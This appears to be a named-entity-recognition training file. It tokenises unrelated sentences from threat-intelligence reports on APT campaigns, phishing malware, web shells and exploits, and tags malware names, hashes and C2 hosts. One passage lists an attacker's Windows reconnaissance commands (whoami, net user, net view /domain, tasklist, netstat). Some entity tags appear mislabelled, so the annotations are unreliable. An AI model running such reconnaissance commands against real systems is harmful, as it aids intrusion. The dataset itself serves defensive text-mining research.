:	O

Attackers	O
can	O
embed	O
malicious	O
VBScript	O
to	O
Office	O
document	O
or	O
website	O
and	O
then	O
obtain	O
the	O
credential	O
of	O
the	O
current	O
user	O
,	O
whenever	O
the	O
user	O
clicks	O
,	O
to	O
execute	O
arbitrary	O
code	O
.	O

Figure	O
3	O
:	O
Printable	O
strings	O
refer	O
to	O
www.google.com.hk	B-url.normal
Figure	O
4	O
:	O
References	O
to	O
Chopper	O
in	O
the	O
client	O
binary	O

Fancybear.net	O
.	O
'	O

There	O
was	O
no	O
indication	O
that	O
the	O
attack	O
was	O
successful	O
,	O
but	O
Chafer	O
did	O
successfully	O
in ltrate	O
an	O
African	O
airline	O
that	O
is	O
a	O
customer	O
of	O
the	O
reservations	O
 rm	O
.	O

Derived	O
from	O
the	O
class	O
,	O
the	O
class	O
's	O
operations	O
are	O
focused	O
largely	O
in	O
the	O
ProcessPacket	O
and	O
ReadWaitingData	O

The	O
'	O
Payment	O
Invoice.jar	O
'	O
malware	O
was	O
sent	O
in	O
a	O
phishing	O
email	O
that	O
contained	O
some	O
of	O
the	O
following	O
details	O
:	O
The	O
'	O
INV#94586.jar	B-malware.infosteal
'	O
malware	O
was	O
sent	O
in	O
a	O
phishing	O
email	O
that	O
contained	O
some	O
of	O
the	O
following	O
details	O
:	O

We	O
assess	O
with	O
moderate	O
confidence	O
that	O
the	O
attacker	O
was	O
developing	O
the	O
capability	O
to	O
cause	O
physical	O
damage	O
and	O
inadvertently	O
shutdown	O
operations	O
.	O

Dec	O
6th	O
2011	O

Format	O
String	O
Example/Explanation	O

Naval	O
Science	O
Curriculum	O
2014.doc	O
1.doc	O
Republic	O
Day	O
speech	O
27	O
Jan	O
2014.doc	O

But	O
Zebrocy	O
efforts	O
are	O
in	O
such	O
high	O
volume	O
,	O
that	O
these	O
modules	O
need	O
examination	O
as	O
well	O
.	O

The	O
reason	O
why	O
the	O
CERT	O
Analysis	O
Team	O
of	O
ANTIY	O
classified	O
APT-TOCS	B-malware.infosteal
into	O
APT	O
incidents	O
is	O
that	O
it	O
's	O
a	O
kind	O
of	O
targeted	O
attack	O
(	O
one	O
of	O
the	O
features	O
of	O
APT	O
attack	O
)	O
,	O
it	O
has	O
anti-detection	O
functions	O
and	O
also	O
it	O
can	O
conceal	O
itself	O
.	O

These	O
details	O
are	O
then	O
used	O
to	O
delete	O
specific	O
transactions	O
,	O
or	O
update	O
transaction	O
amounts	O
appearing	O
in	O
balance	O
reporting	O
messages	O
based	O
on	O
the	O
amount	O
of	O
Convertible	O
Currency	O
available	O
in	O
specific	O
accounts	O
.	O

Since	O
the	O
establishment	O
in	O
December	O
,	O
2014	O
,	O
the	O
team	O
has	O
successflly	O
integrated	O
360	O
's	O
big	O
data	O
base	O
and	O
built	O
up	O
a	O
quick	O
reversing	O
and	O
corellation	O
procudure	O
.	O

The	O
above	O
screenshot	O
illustrates	O
a	O
REconTM	O
trace	O
on	O
the	O
malware	O
dropper	O
and	O
subsequent	O
service	O
creation	O
.	O

On	O
reboot	O
was	O
now	O
happy	O
to	O
load	O
the	O
backdoor	O
and	O
get	O
down	O
to	O
business	O
;	O
this	O
technique	O
is	O
known	O
as	O
dll	O
search	O
order	O
hijacking	O
or	O
binary	O
planting	O
.	O

It	O
is	O
recommended	O
to	O
make	O
sure	O
that	O
the	O
hosts	O
you	O
use	O
are	O
not	O
accessing	O
these	O
URLs	O
.	O

Most	O
security	O
software	O
runs	O
in	O
the	O
background	O
so	O
it	O
may	O
be	O
that	O
users	O
have	O
become	O
more	O
willing	O
to	O
run	O
security	O
software	O
because	O
they	O
know	O
they	O
need	O
it	O
despite	O
that	O
they	O
do	O
n't	O
know	O
what	O
it	O
actually	O
does	O
or	O
how	O
it	O
is	O
supposed	O
to	O
work	O
,	O
just	O
that	O
it	O
is	O
supposed	O
to	O
protect	O
them	O
.	O

To	O
distribute	O
the	O
malicious	O
excel	O
file	O
,	O
the	O
attackers	O
registered	O
a	O
domain	O
which	O
impersonated	O
the	O
identity	O
of	O
most	O
influential	O
Indian	O
think	O
tank	O
IDSA	O
(	O
Institute	O
for	O
Defence	O
Studies	O
and	O
Analyses	O
)	O
and	O
used	O
the	O
email	O
id	O
from	O
the	O
impersonating	O
domain	O
to	O
send	O
out	O
the	O
spear-phishing	O
emails	O
to	O
the	O
victims	O
.	O

The	O
code	O
does	O
not	O
look	O
malicious—just	O
odd	O
.	O

Thus	O
,	O
we	O
will	O
focus	O
our	O
analysis	O
on	O
the	O
function	O
that	O
contains	O
the	O
backdoor	O
code	O
named	O

However	O
,	O
on	O
the	O
first	O
launch	O
,	O
the	O
collected	O
user	O
information	O
is	O
saved	O
into	O
'	O
xmlrwbin.inc	O
'	O
.	O

When	O
the	O
victim	O
opens	O
the	O
attached	O
word	O
document	O
it	O
prompts	O
the	O
user	O
to	O
enable	O
macro	O
content	O
and	O
both	O
the	O
documents	O
(	O
Uri	O
Terror	O
Report.doc	O
and	O
mha-report.doc	O
)	O
displayed	O
the	O
same	O
content	O
and	O
contained	O
a	O
Show	O
Document	O
button	O
as	O
shown	O
below	O
In	O
case	O
of	O
both	O
the	O
documents	O
(	O
Uri	O
Terror	O
Report.doc	O
and	O
mha-report.doc	O
)	O
the	O
malicious	O
macro	O
code	O
was	O
heavily	O
obfuscated	O
(	O
used	O
obscure	O
variable/function	O
names	O
to	O
make	O
analysis	O
harder	O
)	O
and	O
did	O
not	O
contain	O
any	O
auto	O
execute	O
functions.Malicious	O
activity	O
is	O
trigged	O
only	O
on	O
user	O
interaction	O
,	O
attackers	O
normally	O
use	O
this	O
technique	O
to	O
bypass	O
sandbox/automated	O
analysis	O
.	O

But	O
the	O
storage	O
type	O
of	O
lIlIIl	O
is	O
string	O
,	O
so	O
only	O
by	O
modifying	O
the	O
data	O
type	O
to	O
0x200C	O
,	O
i.e.	O
VT_VARIANT	O
|	O
VT_ARRAY	O
(	O
array	O
type	O
)	O
,	O
attackers	O
can	O
achieve	O
their	O
purpose	O
.	O

The	O
correct	O
VBR	O
will	O
likely	O
be	O
the	O
one	O
with	O
information	O
filled	O
in	O
from	O
offset	O
10	O
–	O
80	O
(	O
See	O
Figure	O
2	O
to	O
breakdown	O
)	O
.	O

DHS	O
encourages	O
network	O
administrators	O
to	O
implement	O
the	O
recommendations	O
below	O
,	O
which	O
can	O
prevent	O
as	O
many	O
as	O
85	O
percent	O
of	O
targeted	O
cyber-attacks	O
.	O

DZKSCAAAAJPBBDHDDDOCCDFDFDOCCDBDHDOCHDHDDZJS	O

CROWDSTRIKE	O
INTELLIGENCE	O
HAS	O
ASSESSED	O
THAT	O
THE	O
DISTRIBUTION	O
OF	O
THE	O
MALICIOUS	O
APPLICATION	O
TARGETED	O
THE	O
VERY	O
ARTILLERY	O
UNITS	O
FOR	O
WHICH	O
THE	O
BENIGN	O
APPLICATION	O
WAS	O
DEVELOPED—BRIGADES	O
OPERATING	O
IN	O
EASTERN	O
UKRAINE	O
ON	O
THE	O
FRONTLINES	O
OF	O
THE	O
CONFLICT	O
WITH	O
RUSSIAN-BACKED	O
SEPARATIST	O
FORCES	O
DURINGTHE	O
EARLY	O
STAGES	O
OF	O
THE	O
CONFLICT	O
IN	O
LATE-2014	O
.	O

'	O
Cyber	O
Security	O
Update	O
:	O
WADA	O
's	O
Incident	O
Response	O
.	O
'	O

6939	O
-	O
HURRICANE	O
-	O
Hurricane	O
Electric	O
,	O
Inc	O
.	O

This	O
document	O
can	O
not	O
be	O
modified	O
or	O
converted	O
to	O
any	O
other	O
electronic	O
or	O
machine-readable	O
form	O
in	O
whole	O
or	O
in	O
part	O
without	O
prior	O
written	O
approval	O
of	O
Fidelis	O
Cybersecurity	O
,	O
Inc	O
.	O

Mem	O
members	O
of	O
2	O
classes	O
created	O
by	O
UAF	O
are	O
offset	O
by	O
0x0c	O
bytes	O
,	O
and	O
an	O
array	O
of	O
0x7fffffff	O
size	O
is	O
forged	O
by	O
reading	O
and	O
writing	O
operation	O
to	O
the	O
two	O
mem	O
members	O
.	O

downloader	O
-	O
>	O
hta	O
checkin	O
-	O
>	O
info	O
stealer	O
-	O
>	O
more	O
compiled	O
components	O
.	O

No	O
parties	O
in	O
Libya	O
before	O
this	O
analysis	O
reported	O
to	O
use	O
cyber	O
attacks	O
,	O
malwares	O
nor	O
recruit	O
hackers	O
to	O
spy	O
on	O
their	O
rivals	O
.	O

InitialDelay	O
:	O
00000000	O
DWORD	O

What	O
's	O
New	O
in	O
Ramallah	O
?	O

cc9e6578a47182a941a478b276320e06	O
Summary	O
:	O
This	O
earlier	O
SPLM	B-malware.backdoor
variant	O
found	O
on	O
the	O
DNC	O
network	O
in	O
2016	O
still	O
maintains	O
the	O
internal	O
name	O
'	O
splm.dll	O
'	O
,	O
with	O
only	O
one	O
export	O
'	O
init	O
'	O
that	O
was	O
called	O
at	O
runtime	O
.	O

SPLM	B-malware.backdoor
64-bit	I-malware.backdoor
modules	I-malware.backdoor
already	O
appeared	O
to	O
be	O
at	O
version	O
4	O
of	O
the	O
software	O
by	O
May	O
of	O
the	O
year	O
.	O

Figure	O
23	O
:	O
A	O
packet	O
capture	O
shows	O
that	O
the	O
Web	B-malware.ransom
shell	O
traffic	O
is	O
HTTP	O
POST	O
traffic	O
over	O
TCP	O
port	O
80	O

(	O
909125d1de7ac584c15f81a34262846f	B-hash
)	O
Some	O
samples	O
had	O
two	O
hardcoded	O
command	O
and	O
control	O
servers	O
:	O
iecrs[.]co	O
and	O
iecr[.]co	O
(	O
note	O
once	O
again	O
the	O
use	O
of	O
IEC	O
in	O
the	O
domain	O
name	O
)	O
.	O

Below	O
is	O
the	O
description	O
of	O
the	O
strings	O
passed	O
in	O
the	O
C2	O
communication	O

Thu	O
Jun	O
14	O
2012	O
12:31:34	O
52719	O
mac	O
.	O

In	O
particular	O
,	O
in	O
November	O
2011	O
Laura	O
Aylward	O
of	O
Contextis	O
published	O
an	O
excellent	O
analysis	O
[	O
http://www.contextis.com/research/blog/darkcometrat/	B-url.normal
]	O
of	O
Dark	B-malware.backdoor
Comet	I-malware.backdoor
in	O
which	O
she	O
described	O
the	O
basic	O
cryptographic	O
mechanism	O
used	O
by	O
DarkComet	B-malware.backdoor
bots	O
to	O
hide	O
their	O
communications	O
;	O
Laura	O
's	O
analysis	O
saved	O
us	O
a	O
considerable	O
amount	O
of	O
time	O
.	O

It	O
will	O
then	O
retry	O
the	O
connection	O
with	O
the	O
next	O
remote	O
host	O
,	O
if	O
there	O
is	O
one	O
.	O

38	O
.	O

brou.com[.]uy	B-url.unknown
(	O
currently	O
clean	O
)	O

This	O
opaque	O
information	O
complicates	O
the	O
analysis	O
a	O
little	O
bit	O
,	O
but	O
it	O
is	O
still	O
possible	O
to	O
obtain	O
interesting	O
results	O
.	O

Finally	O
,	O
the	O
trojan	O
Import	O
Address	O
Table	O
(	O
IAT	O
)	O
is	O
resolved	O
and	O
the	O
file	O
path	O
of	O
the	O
process	O
that	O
hosts	O
the	O
dll	O
is	O
resolved	O
and	O
saved	O
in	O
a	O
global	O
variable	O
.	O

SPLM	B-malware.backdoor
,	O
GAMEFISH	O
,	O
and	O
Zebrocy	O
delivery	O
all	O
maintain	O
their	O
own	O
clusters	O
,	O
but	O
frequently	O
overlap	O
later	O
.	O

When	O
a	O
web	O
shell	O
is	O
hosted	O
on	O
an	O
internet	O
facing	O
victim	O
system	O
,	O
an	O
adversary	O
can	O
remotely	O
access	O
the	O
system	O
to	O
perform	O
malicious	O
actions	O
.	O

Once	O
an	O
infected	O
machine	O
connects	O
,	O
you	O
see	O
its	O
information	O
displayed	O
in	O
a	O
selection	O
box	O
at	O
the	O
top	O
.	O

The	O
following	O
actionable	O
intelligence	O
can	O
be	O
used	O
to	O
identify	O
exploit	O
remnants	O
in	O
the	O
heap	O
space	O
of	O
Internet	O
Explorer	O
post	O
exploitation	O
attempt	O
.	O

Record	O
#	O
1	O
Length	O
:	O
96	O
bytes	O
:	O

The	O
technique	O
is	O
described	O
here	O
.	O

The	O
campaign	O
targeted	O
only	O
a	O
few	O
select	O
devices	O
(	O
13	O
)	O
that	O
are	O
all	O
located	O
in	O
India	O
.	O

The	O
larger	O
,	O
300kb+	O
SPLM	B-malware.backdoor
backdoors	O
deployed	O
in	O
2016	O
and	O
2017	O
are	O
not	O
observed	O
any	O
longer	O
at	O
targets	O
in	O
2018	O
.	O

Advanced	O
malware	O
bypasses	O
these	O
defenses	O
by	O
employing	O
techniques	O
such	O
as	O
dynamic	O
botnet	O
obfuscation	O
,	O
network	O
based	O
fragmentation	O
and	O
session	O
splicing	O
,	O
application	O
or	O
protocol	O
violations	O
,	O
disabling	O
intrusion	O
detection	O
systems	O
(	O
IDSs	O
)	O
,	O
to	O
more	O
advanced	O
techniques	O
such	O
as	O
encryption	O
and	O
code	O
reuse	O
attacks.Carefully	O
crafted	O
exploits	O
can	O
avoid	O
even	O
advanced	O
heuristic	O
detection	O
algorithms	O
used	O
in	O
today	O
's	O
antivirus	O
software	O
.	O

Alternatively	O
,	O
this	O
string	O
can	O
be	O
replaced	O
by	O
'	O
@	O
boot	O
'	O
for	O
a	O
command	O
to	O
run	O
at	O
each	O
startup	O
–	O
whereas	O
some	O
Unix	O
cron	O
implementations	O
accept	O
'	O
@	O
reboot	O
'	O
.	O

Second	O
,	O
the	O
attacker	O
must	O
have	O
performed	O
OT	O
reconnaissance	O
and	O
have	O
sufficient	O
specialized	O
engineering	O
knowledge	O
to	O
understand	O
the	O
industrial	O
process	O
being	O
controlled	O
and	O
successfully	O
manipulate	O
it	O
.	O

Password	O
the	O
attached	O
document	O
:	O
cbr	O
'	O

Our	O
forensics	O
endeavor	O
revealed	O
a	O
number	O
of	O
indicators	O
that	O
made	O
us	O
think	O
XAgent	B-malware.backdoor
was	O
distributed	O
via	O
Komplex	O
malware	O
:	O

Russia	O
,	O
like	O
many	O
nations	O
,	O
has	O
long	O
viewed	O
success	O
in	O
the	O
Olympic	O
Games	O
as	O
a	O
source	O
of	O
national	O
prestige	O
and	O
soft	O
power	O
on	O
the	O
world	O
stage	O
.	O

Code	O
execution	O
does	O
not	O
use	O
the	O
traditional	O
ROP	O
or	O
GodMod	O
,	O
but	O
through	O
the	O
script	O
layout	O
Shellcode	O
to	O
stabilize	O
the	O
use	O
.	O

Babar	B-malware.drop
supports	O
trampoline	O
functions	O
for	O
a	O
limited	O
list	O
of	O
APIs	O
and	O
limited	O
to	O
a	O
set	O
of	O
processes	O
of	O
interest	O
,	O
defined	O
by	O
its	O
configuration	O
.	O

COM	B-url.cncsvr
,	O
appeared	O
to	O
be	O
a	O
fake	O
version	O
of	O
CBIUAE.COM	B-url.normal
,	O
the	O
actual	O
domain	O
of	O
the	O
website	O
of	O
Commercial	O
Bank	O
International	O
of	O
the	O
United	O
Arab	O
Emirates	O
.	O

This	O
Tiny	B-malware.backdoor
Meterpreter	I-malware.backdoor
backdoor	O
dropped	O
two	O
different	O
malware	O
families	O
:	O
Win32/Spy.Sekur	O
–	O
well	O
known	O
malware	O
used	O
by	O
the	O
Carbanak	B-malware.infosteal
gang	O
Win32/Wemosis	B-malware.backdoor
–	O
a	O
PoS	O
RAM	O
Scraper	O
backdoor	O
As	O
mentioned	O
here	O
by	O
our	O
colleagues	O
from	O
TrendMicro	O
,	O
Carbanak	B-malware.infosteal
malware	O
is	O
capable	O
of	O
targeting	O
Epicor/NSB	O
PoS	O
systems	O
,	O
while	O
Win32/Wemosis	B-malware.backdoor
is	O
a	O
general-purpose	O
PoS	O
RAM	O
Scraper	O
which	O
targets	O
any	O
PoS	O
that	O
stores	O
card	O
data	O
in	O
the	O
memory	O
.	O

Business	O
–	O
photographic	O
studio	O
Industrial	O
enterprise	O
,	O
construction	O
company	O
Door	O
manufacturing	O

In	O
this	O
attack	O
,	O
which	O
we	O
first	O
observed	O
in	O
the	O
second	O
week	O
of	O
June	O
,	O
the	O
potential	O
victim	O
is	O
encouraged	O
to	O
visit	O
a	O
download	O
link	O
containing	O
a	O
malicious	O
installer	O
of	O
Freegate	B-malware.infosteal
.	O

중앙관리	O
솔루션	O
공격은	O
크게	O
관리	O
서버	O
계정을	O
이용한	O
공격과	O
클라이언트	O
에이전	O
트	O
취약점을	O
이용한	O
공격으로	O
구분할	O
수	O
있다	O
.	O

Because	O
the	O
function	O
is	O
excessively	O
used	O
and	O
encoded	O
gibberish	O
strings	O
are	O
always	O
passed	O
to	O
it	O
,	O
we	O
can	O
be	O
confident	O
that	O
the	O
function	O
is	O
truly	O
a	O
string	O
decoder	O
.	O

Player	O
5	O
has	O
entered	O
the	O
game	O
....	O

Furthermore	O
,	O
the	O
samples	O
at	O
hand	O
show	O
the	O
same	O
partial	O
API	O
name	O
obfuscation	O
as	O
Bunny	B-malware.unknown
and	O
TFC	O
.	O

Nevertheless	O
,	O
we	O
can	O
reveal	O
some	O
screenshots	O
of	O
the	O
administration	O
panel	O
which	O
are	O
available	O
on	O
the	O
underground	O
.	O

An	O
FLV	O
file	O
is	O
an	O
interesting	O
choice	O
of	O
decoy	O
document	O
since	O
it	O
is	O
not	O
a	O
standard	O
video	O
format	O
for	O
media	O
players	O
.	O

cmd.exe	O
/c	O
hostname	O
cmd.exe	O
/c	O
whoami	O
cmd.exe	O
/c	O
ver	O
cmd.exe	O
/c	O
ipconfig	O
-all	O
cmd.exe	O
/c	O
ping	O
www.google.com	B-url.normal
cmd.exe	O
/c	O
query	O
user	O
cmd.exe	O
/c	O
net	O
user	O
cmd.exe	O
/c	O
net	O
view	O
cmd.exe	O
/c	O
net	O
view	O
/domain	O
cmd.exe	O
/c	O
reg	O
query	O
'	O
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet	O
Settings	O
'	O
cmd.exe	O
/c	O
tasklist	O
/svc	O
cmd.exe	O
/c	O
netstat	O
-ano	O
|	O
find	O
'	O
TCP	O
'	O

Image	O
3	O
.	O

Additionally	O
,	O
while	O
the	O
overlap	O
with	O
Appin	O
exists	O
,	O
the	O
fact	O
that	O
domains	O
used	O
the	O
same	O
IP	O
at	O
the	O
same	O
time	O
is	O
insufficient	O
for	O
concrete	O
attribution	O
.	O

1/19/2017	O
In	O
my	O
previous	O
blog	O
I	O
posted	O
details	O
of	O
a	O
cyber	O
attack	O
targeting	O
Indian	O
government	O
organizations	O
.	O

The	O
MuddyWater	O
campaign	O
was	O
first	O
sighted	O
in	O
2017	O
when	O
it	O
targeted	O
the	O
Saudi	O
government	O
using	O
an	O
attack	O
involving	O
PowerShell	O
scripts	O
deployed	O
via	O
Microsoft	O
Office	O
Word	O
macro	O
.	O

The	O
Framework	O
provides	O
standards	O
,	O
guidelines	O
,	O
and	O
practices	O
that	O
are	O
working	O
effectively	O
today	O
.	O

This	O
is	O
often	O
the	O
case	O
in	O
this	O
type	O
of	O
large-scale	O
cyber	O
espionage	O
operations	O
.	O

The	O
core	O
export	O
functions	O
are	O
AccessDebugTracer	O
and	O
AccessRetailTracer	O
.	O

These	O
samples	O
are	O
then	O
stored	O
for	O
further	O
analysis	O
.	O

We	O
are	O
referring	O
to	O
these	O
campaigns	O
as	O
Metamorfo	B-malware.drop
.	O

These	O
attacks	O
require	O
more	O
'	O
steps	O
'	O
to	O
reach	O
their	O
ultimate	O
target	O
,	O
which	O
adds	O
additional	O
time	O
and	O
risk	O
for	O
attackers	O
to	O
reach	O
their	O
targets	O
.	O

We	O
estimate	O
that	O
it	O
served	O
malware	O
.	O

The	O
latest	O
known	O
sample	O
in	O
this	O
campaign	O
(	O
7ceac3389a5c97a3008aae9a270c706a	B-hash
)	O
has	O
compilation	O
timestamp	O
of	O
February	O
12	O
,	O
2017	O
.	O

PowerShell	O
command	O
started	O
major	O
local	O
PowerShell	O
;	O
updated	O
build.sh	O
tool	O
.	O

It	O
also	O
starts	O
a	O
thread	O
that	O
retrieves	O
the	O
current	O
foreground	O
window	O
handle	O
every	O
100	O
milliseconds	O
.	O

Whilst	O
macanna.com[.]tw	B-url.unknown
appears	O
to	O
be	O
a	O
legitimate	O
site	O
,	O
it	O
has	O
also	O
been	O
observed	O
as	O
being	O
a	O
command	O
and	O
control	O
destination	O
for	O
malware	O
.	O

이러한	O
중앙관리	O
솔루션의	O
역할은	O
주로	O
네트워크접근제어	O
(	O
NAC	O
)	O
,	O
백신	O
(	O
Anti-virus	O
)	O
,	O
소프트웨어	O
및	O
하드웨어	O
자산	O
,	O
소프트웨어	O
패치	O
(	O
PMS	O
)	O
관리	O
등이며	O
,	O
대개	O
IT	O
자산	O
관리	O
,	O
보고서	O
생성	O
,	O
소프트웨어	O
배포	O
,	O
원격제어	O
등의	O
기능을	O
제공한다	O
.	O

This	O
functionality	O
is	O
triggered	O
by	O
making	O
a	O
request	O
to	O
either	O
JobTcp1.php	O
or	O
JobTcp2.php	O
,	O
if	O
the	O
C2	O
response	O
satisfies	O
the	O
condition	O
then	O
it	O
gets	O
the	O
executable	O
content	O
from	O
a	O
hard	O
coded	O
IP	O
address	O
.	O

java	O
khobe	O

First	O
Seen	O
:	O

The	O
malware	O
was	O
delivered	O
as	O
a	O
Py2EXE	O
compiled	O
python	O
script	O
dependent	O
on	O
a	O
zip	O
file	O
containing	O
standard	O
Python	O
libraries	O
,	O
open	O
source	O
libraries	O
,	O
as	O
well	O
as	O
the	O
attacker-developed	O
Triconex	B-malware.unknown
attack	O
framework	O
for	O
interacting	O
with	O
the	O
Triconex	B-malware.unknown
controllers	O
.	O

The	O
core	O
part	O
of	O
APT-TOCS	B-malware.infosteal
relies	O
on	O
the	O
encrypted	O
data	O
scripts	O
(	O
hereinafter	O
referred	O
to	O
as	O
Sample	O
B	O
)	O
downloaded	O
by	O
PowerShell	O
.	O

Command	O

POSSIBLE	O
ATTACKER	O
SUPPLY	O
CHAIN	O
OR	O
TRAINING	O
REGIMEN	O

DLL	B-malware.backdoor
hijacking	O
is	O
a	O
technique	O
used	O
by	O
some	O
APT	O
malware	O
in	O
which	O
instead	O
of	O
the	O
legitimate	O
application	O
(	O
.exe	O
)	O
loading	O
the	O
benign	O
DLL	O
,	O
the	O
application	O
is	O
tricked	O
into	O
loading	O
a	O
DLL	O
containing	O
malicious	O
code	O
.	O

The	O
following	O
is	O
a	O
screenshot	O
of	O
the	O
email	O
:	O
The	O
'	O
Hold-transactions-pdf.jar/verification-docx.jar	B-malware.infosteal
'	O
malware	O
beaconed	O
to	O
'	O
184.22.201[.]27	B-malware.infosteal
'	O
over	O
port	O

With	O
services	O
that	O
include	O
strategy	O
and	O
risk	O
management	O
,	O
cyber	O
defense	O
,	O
digital	O
identity	O
,	O
application	O
security	O
and	O
managed	O
security	O
,	O
Accenture	O
enables	O
businesses	O
around	O
the	O
world	O
to	O
defend	O
against	O
known	O
sophisticated	O
threats	O
,	O
and	O
the	O
unknown	O
.	O

The	O
group	O
has	O
been	O
conducting	O
long-term	O
monitoring	O
on	O
the	O
targets	O
to	O
stole	O
confidential	O
data	O
.	O

Following	O
the	O
Green	O
Revolution	O
,	O
the	O
Iranian	O
government	O
considered	O
adding	O
a	O
formal	O
offensive	O
cyber	O
component	O
to	O
its	O
existing	O
intelligence	O
apparatus	O
,	O
and	O
was	O
forced	O
to	O
address	O
a	O
personnel	O
problem	O
.	O

This	O
post	O
was	O
authored	O
by	O
Mariano	O
Graziano	O
.	O

Compromising	O
both	O
the	O
DCS	O
and	O
SIS	O
system	O
would	O
enable	O
the	O
attacker	O
to	O
develop	O
and	O
carry	O
out	O
an	O
attack	O
that	O
causes	O
the	O
maximum	O
amount	O
of	O
damage	O
allowed	O
by	O
the	O
physical	O
and	O
mechanical	O
safeguards	O
in	O
place	O
.	O

'	O
Microsoft	O
Security	O
Advisory	O
(	O
2269637	O
)	O
:	O
Insecure	O
Library	O
Loading	O
Could	O
Allow	O
Remote	O
Code	O
Execution	O
'	O
Last	O
accessed	O
August	O
30	O
,	O
2013.	O
http://technet.microsoft.com/en-us/security/advisory/2269637	O
http://msdn.microsoft.com/en-us/library/windows/desktop/dd407288	O
(	O
v=vs.85	O
)	O
.aspx	O
Microsoft	O
.	O

29	O
Dec	O
.	O

Since	O
at	O
least	O
2009	O
,	O
the	O
Islamic	O
Republic	O
of	O
Iran	O
has	O
regularly	O
responded	O
to	O
sanctions	O
or	O
perceived	O
provocations	O
by	O
conducting	O
offensive	O
cyber	O
campaigns	O
.	O

Globalization	O
has	O
woven	O
the	O
Internet	O
into	O
a	O
fabric	O
that	O
interlaces	O
practically	O
every	O
aspect	O
of	O
modern	O
living	O
.	O

The	O
dropper	O
will	O
decode	O
this	O
DLL	O
from	O
its	O
resource	O
section	O
,	O
drop	O
it	O
onto	O
the	O
victim	O
's	O
system	O
,	O
and	O
proceed	O
to	O
fill	O
its	O
resource	O
section	O
with	O
randomly	O
generated	O
data	O
.	O

When	O
the	O
user	O
opens	O
the	O
document	O
DDEAUTO	O
or	O
Link	O
Auto	O
Update	O
,	O
Office	O
will	O
display	O
a	O
message	O
.	O

The	O
following	O
factors	O
in	O
this	O
cyber	O
attack	O
suggests	O
the	O
possible	O
involvement	O
of	O
Pakistan	O
state	O
sponsored	O
cyber	O
espionage	O
group	O
to	O
spy	O
or	O
to	O
take	O
control	O
of	O
the	O
systems	O
of	O
the	O
officials	O
of	O
Central	O
Bureau	O
of	O
Investigation	O
(	O
CBI	O
)	O
and	O
officials	O
of	O
the	O
Indian	O
Army	O
.	O

File	O
Name	O
:	O
d9821468315ccd3b9ea03161566ef18e.dll	O
File	O
Size	O
:	O
28672	O
bytes	O
MD5	O
:	O
SHA1	O
:	O
PE	O
Time	O
:	O
PEID	O
Sig	O
:	O
Sections	O
(	O
5	O
)	O
:	O
Name	O
.text	O
.rdata	O
.data	O
.rsrc	O
.reloc	O
ee6cde0fdae9bfa6c18b3783a23d0952	B-hash
886f6f3780467a511ae909d20390df5b	B-hash
54d7948676ee96b2f9e0a141598b564d	B-hash
e5665b3b3ffbbfcd5f2cbf31677fcbf9	B-hash
c1cea8dced657cfc85b045a2421417f1	B-hash
Entropy	O
6.48	O
4.77	O
1.16	O
5.55	O
4.64	O

The	O
discovery	O
of	O
the	O
XAgent	O
module	O
once	O
again	O
reasserts	O
the	O
need	O
for	O
organizations	O
to	O
tackle	O
computer	O
security	O
in	O
a	O
unified	O
manner	O
,	O
regardless	O
of	O
the	O
operating	O
system	O
mix	O
they	O
have	O
deployed	O
.	O

This	O
technique	O
allows	O
the	O
attackers	O
to	O
validate	O
if	O
they	O
are	O
connecting	O
to	O
the	O
correct	O
C2	O
server	O
and	O
also	O
this	O
technique	O
does	O
not	O
reveal	O
any	O
malicious	O
behavior	O
in	O
dynamic/sandbox	O
analysis	O
until	O
the	O
correct	O
response	O
is	O
given	O
to	O
the	O
malware	O
.	O

Sri	O
Lankan	O
police	O
have	O
since	O
arrested	O
another	O
individual	O
and	O
a	O
further	O
suspect	O
is	O
wanted	O
by	O
Sri	O
Lankan	O
law	O
enforcement	O
.	O

Web	O
.	O

With	O
the	O
command	O
line	O
patched	O
and	O
authority	O
verified	O
,	O
the	O
server	O
variant	O
sleeps	O
for	O
5	O
seconds	O
before	O
verifying	O
that	O
the	O
fShutdown	O
flag	O
is	O
not	O
set	O
.	O

When	O
the	O
recipient	O
of	O
the	O
email	O
opens	O
the	O
attached	O
excel	O
file	O
it	O
prompts	O
the	O
user	O
to	O
enable	O
macro	O
content	O
and	O
the	O
excel	O
also	O
contains	O
instruction	O
on	O
how	O
to	O
enable	O
the	O
macros	O
.	O

Persistence	O
:	O

For	O
example	O
,	O
the	O
value	O
reported	O
after	O
successful	O
retrieval	O
of	O
the	O
first	O
stage	O
is	O
'	O
0-0-0	O
'	O
.	O

File	O
/	O
Process	O
name	O
bitsran.exe	B-malware.drop

A	O
scientific	O
research	O
institute	O
.	O

The	O
code	O
is	O
specifically	O
crafted	O
to	O
look	O
for	O
a	O
user-created	O
DLL	O
communicating	O
with	O
the	O
Siemens	O
PLCSIM	O
environment	O
.	O

The	O
most	O
common	O
example	O
is	O
SQL	O
injection	O
,	O
which	O
subverts	O
the	O
relationship	O
between	O
a	O
webpage	O
and	O
its	O
supporting	O
database	O
,	O
typically	O
to	O
obtain	O
information	O
contained	O
inside	O
the	O
database	O
.	O

CTU	O
researchers	O
have	O
not	O
observed	O
TG-4127	B-malware.infosteal
use	O
this	O
technique	O
(	O
using	O
Bitly	O
short	O
links	O
)	O
to	O
target	O
the	O
U.S.	O
Republican	O
party	O
or	O
the	O
other	O
U.S.	O
presidential	O
candidates	O
whose	O
campaigns	O
were	O
active	O
between	O
mid-March	O
and	O
mid-May	O
:	O
Donald	O
Trump	O
,	O
Bernie	O
Sanders	O
,	O
Ted	O
Cruz	O
,	O
Marco	O
Rubio	O
,	O
and	O
John	O
Kasich	O
.	O

'	O
Russia	O
'	O
was	O
Behind	O
German	O
Parliament	O
Hack	O
.	O
'	O
'	O

The	O
backdoor	O
contains	O
identical	O
exports	O
as	O
well	O
as	O
an	O
additional	O
dummy	O
function	O
from	O
the	O
legitimate	O
called	O
'	O
StartWork	O
'	O
which	O
can	O
be	O
used	O
to	O
reliably	O
identify	O
similar	O
samples	O
.	O

The	O
DLL	O
then	O
reads	O
this	O
file	O
,	O
and	O
decrypts	O
it	O
with	O
a	O
running	O
XOR	O
mask	O
.	O

2016	O
.	O

Sample	O
A.	O
UCL	O
decompression	O
Sample	O
B	O
Sample	O
B	O
execution	O
Update	O
on	O
Jul	O
03	O
2014	O
:	O
F-Secure	O
released	O
an	O
analysis	O
of	O
the	O
latest	O
MiniDuke	B-malware.unknown
evolution	O
,	O
called	O
'	O
CosmicDuke	B-malware.unknown
'	O
,	O
mentioning	O
similar	O
loaders	O
in	O
old	O
and	O
new	O
samples	O
.	O

For	O
investigators	O
to	O
trace	O
an	O
attack	O
,	O
